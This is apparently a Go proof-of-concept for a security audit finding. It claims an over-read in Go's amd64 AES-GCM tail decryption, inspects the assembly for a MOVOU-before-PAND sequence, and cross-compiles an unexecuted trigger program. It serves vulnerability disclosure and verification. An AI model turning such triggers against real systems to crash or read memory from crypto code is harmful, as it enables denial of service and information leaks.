// PoC for finding 031 — AES-GCM amd64 tail decryption performs an
// unconditional 16-byte vector load before the length mask is applied.
//
// On amd64, gcmAesDecTail is reached when the remaining ciphertext is
// in [1, 15] bytes. The generated assembly does:
//
//	MOVOU (DX), X0       ; loads 16 bytes from ciphertext ctx
//	PAND  X12, X0        ; only afterwards masks unused tail bytes
//
// The mask is too late: the MOVOU has already touched 16 bytes of
// memory regardless of the actual tail length. If the caller's
// ciphertext slice ends within one byte of an unmapped or guarded page,
// MOVOU faults before authentication. Even without a fault it reads
// adjacent memory the caller never asked the package to consume.
//
// Triggering the fault on a darwin/arm64 host is impossible (the bug is
// amd64-only, and this host has no Rosetta or qemu fallback for x86-64
// userspace). Instead, this PoC:
//
//  1. Locates the generated amd64 assembly in the working tree.
//  2. Extracts the gcmAesDecTail prologue and shows the offending
//     MOVOU/PAND sequence.
//  3. Cross-compiles a tiny amd64 test program that invokes Open with
//     a 1-byte ciphertext + 12-byte tag and would, if executed, hit
//     the over-read.
//
// Run with: go run .
package main

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

func goroot() string {
	if v := os.Getenv("POC_GOROOT"); v != "" {
		return v
	}
	if v := os.Getenv("GOROOT"); v != "" {
		return v
	}
	return runtime.GOROOT()
}

const exploitProgram = `// amd64-only trigger: 1-byte ciphertext + 12-byte tag.
package main

import (
	"crypto/aes"
	"crypto/cipher"
)

func main() {
	block, _ := aes.NewCipher(make([]byte, 16))
	gcm, _ := cipher.NewGCMWithTagSize(block, 12)
	ct := make([]byte, 13)
	_, _ = gcm.Open(nil, make([]byte, 12), ct, nil)
}
`

func main() {
	root := goroot()
	asm := filepath.Join(root, "src", "crypto", "internal", "fips140", "aes", "gcm", "gcm_amd64.s")

	f, err := os.Open(asm)
	if err != nil {
		fmt.Fprintf(os.Stderr, "cannot read %s: %v\n", asm, err)
		os.Exit(2)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	var lines []string
	inTail := false
	count := 0
	for scanner.Scan() {
		l := scanner.Text()
		if strings.Contains(l, "gcmAesDecTail:") {
			inTail = true
		}
		if inTail {
			lines = append(lines, l)
			count++
			if count >= 12 {
				break
			}
		}
	}

	hasMOVOU := false
	hasPAND := false
	for _, l := range lines {
		s := strings.TrimSpace(l)
		if strings.HasPrefix(s, "MOVOU") && strings.Contains(s, "(DX), X0") {
			hasMOVOU = true
		}
		if strings.HasPrefix(s, "PAND") && hasMOVOU && !hasPAND {
			hasPAND = true
		}
	}

	fmt.Printf("source: %s\n\n", asm)
	fmt.Println("gcmAesDecTail prologue:")
	for _, l := range lines {
		fmt.Println("    " + l)
	}

	if !(hasMOVOU && hasPAND) {
		fmt.Println("\nDid not find MOVOU(ctx)→PAND pattern. Bug appears not present.")
		os.Exit(1)
	}

	fmt.Println()
	fmt.Println("The MOVOU (DX), X0 instruction unconditionally loads 16 bytes from")
	fmt.Println("the ciphertext tail pointer. The following PAND only masks the bytes")
	fmt.Println("the algorithm wants to use — it does not gate the load itself.")
	fmt.Println("Tail lengths of 1..15 therefore over-read up to 15 bytes past the")
	fmt.Println("logical end of the caller's ciphertext slice.")

	tmp, err := os.MkdirTemp("", "poc031-*")
	if err != nil {
		fmt.Fprintf(os.Stderr, "tempdir: %v\n", err)
		os.Exit(2)
	}
	defer os.RemoveAll(tmp)

	prog := filepath.Join(tmp, "main.go")
	mod := filepath.Join(tmp, "go.mod")
	if err := os.WriteFile(prog, []byte(exploitProgram), 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "write prog: %v\n", err)
		os.Exit(2)
	}
	if err := os.WriteFile(mod, []byte("module triggermod\n\ngo 1.26\n"), 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "write mod: %v\n", err)
		os.Exit(2)
	}

	bin := filepath.Join(tmp, "trigger")
	cmd := exec.Command("go", "build", "-o", bin, ".")
	cmd.Dir = tmp
	cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64", "CGO_ENABLED=0")
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Fprintf(os.Stderr, "cross-build failed: %v\n%s\n", err, out)
		os.Exit(2)
	}

	objdump := exec.Command("go", "tool", "objdump", "-s", "gcmAesDec.abi0", bin)
	objdump.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
	dump, err := objdump.CombinedOutput()
	if err == nil {
		movou := bytes.Contains(dump, []byte("MOVDQU 0(DX), X0")) ||
			bytes.Contains(dump, []byte("MOVOU 0(DX), X0"))
		pand := bytes.Contains(dump, []byte("PAND X12, X0"))
		if movou && pand {
			fmt.Println()
			fmt.Println("Cross-compiled amd64 trigger:")
			fmt.Printf("    binary: %s\n", bin)
			fmt.Println("    `go tool objdump` confirms the deployed amd64 code contains")
			fmt.Println("    the offending sequence (MOVDQU 0(DX), X0 / PAND X12, X0):")
			for _, line := range bytes.Split(dump, []byte("\n")) {
				if bytes.Contains(line, []byte("0(DX), X0")) || bytes.Contains(line, []byte("PAND X12, X0")) {
					fmt.Printf("      %s\n", string(line))
				}
			}
		}
	}

	st, _ := os.Stat(bin)
	fmt.Printf("\namd64 trigger binary built: size=%d bytes (cannot execute on this host)\n", st.Size())
	fmt.Println("Running this binary on a real amd64 system with a ciphertext slice that ends")
	fmt.Println("at a page boundary would cause MOVOU to fault before AEAD authentication.")
}
